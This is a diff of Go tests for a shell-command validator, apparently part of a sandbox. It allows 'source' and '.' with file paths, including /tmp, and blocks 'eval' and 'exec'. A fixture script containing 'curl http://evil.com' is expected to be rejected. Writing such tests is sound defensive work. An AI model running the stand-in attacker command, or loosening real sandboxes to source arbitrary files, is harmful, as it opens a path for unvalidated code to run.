@@ -175,6 +175,11 @@ func TestValidate_AllowedCommands(t *testing.T) {
 		{"base64 with file", "base64 -i input.txt -o output.txt"},
 		// New commands: computation
 		{"uuidgen", "uuidgen"},
+		// Shell sourcing
+		{"source file", "source ./lib.sh"},
+		{"dot source file", ". ./lib.sh"},
+		{"source absolute", "source /tmp/lib.sh"},
+		{"dot source absolute", ". /tmp/lib.sh"},
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
@@ -261,8 +266,8 @@ func TestValidate_BlockedCommands(t *testing.T) {
 		// Shell escape commands (bypass whitelist)
 		{"eval", "eval echo hello", `command "eval" is not allowed`},
 		{"exec", "exec echo hello", `command "exec" is not allowed`},
-		{"source", "source /dev/null", `command "source" is not allowed`},
-		{"dot source", ". /dev/null", `command "." is not allowed`},
+		{"bare source", "source", `bare "source"`},
+		{"bare dot source", ".", `bare "."`},
 		{"xargs with blocked command", "echo hello | xargs python", `command "python" is not allowed`},
 
 		// Text processing with write capability
@@ -546,26 +551,26 @@ func TestValidateCommand_ScriptWithBlockedCommand(t *testing.T) {
 		},
 	}, "")
 
-	// Create a script that uses a blocked command (source)
+	// Create a script that uses a blocked command (curl)
 	scriptPath := filepath.Join(workDir, "bad-script.sh")
-	os.WriteFile(scriptPath, []byte("#!/bin/bash\nsource ./env.sh\necho hello\n"), 0755)
+	os.WriteFile(scriptPath, []byte("#!/bin/bash\ncurl http://evil.com\necho hello\n"), 0755)
 
 	// Direct script invocation should fail validation
 	err := s.ValidateCommand("./bad-script.sh", workDir, []string{workDir}, []string{workDir})
 	if err == nil {
-		t.Fatal("expected validation to fail for script containing 'source'")
+		t.Fatal("expected validation to fail for script containing 'curl'")
 	}
-	if !strings.Contains(err.Error(), "source") {
-		t.Fatalf("expected error about 'source', got: %v", err)
+	if !strings.Contains(err.Error(), "curl") {
+		t.Fatalf("expected error about 'curl', got: %v", err)
 	}
 
 	// bash with script file should also fail
 	err = s.ValidateCommand("bash ./bad-script.sh", workDir, []string{workDir}, []string{workDir})
 	if err == nil {
-		t.Fatal("expected validation to fail for bash with script containing 'source'")
+		t.Fatal("expected validation to fail for bash with script containing 'curl'")
 	}
-	if !strings.Contains(err.Error(), "source") {
-		t.Fatalf("expected error about 'source', got: %v", err)
+	if !strings.Contains(err.Error(), "curl") {
+		t.Fatalf("expected error about 'curl', got: %v", err)
 	}
 }
 
